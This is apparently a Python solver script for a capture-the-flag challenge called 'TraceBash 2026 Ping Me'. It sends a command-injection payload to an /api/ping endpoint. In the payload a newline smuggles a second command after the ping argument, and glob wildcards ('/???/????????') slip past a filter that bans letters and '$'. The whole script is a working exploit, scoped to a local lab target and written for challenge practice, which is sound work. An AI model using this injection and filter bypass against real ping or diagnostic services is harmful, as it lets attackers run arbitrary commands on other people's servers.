#!/usr/bin/env python3
"""Solve TraceBash 2026 Ping Me without relying on the challenge UI."""

import argparse
import json
import urllib.request


PAYLOAD = b"1\n/???/????????"


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("base_url", help="for example http://127.0.0.1:5030")
    args = parser.parse_args()

    if len(PAYLOAD) != 15:
        raise SystemExit("payload length changed")
    if any(byte in b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ$" for byte in PAYLOAD):
        raise SystemExit("payload contains a forbidden character")

    request = urllib.request.Request(
        args.base_url.rstrip("/") + "/api/ping",
        data=PAYLOAD,
        headers={"Content-Type": "text/plain"},
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=10) as response:
        result = json.loads(response.read())
    print(result.get("output") or result.get("error") or result)


if __name__ == "__main__":
    main()
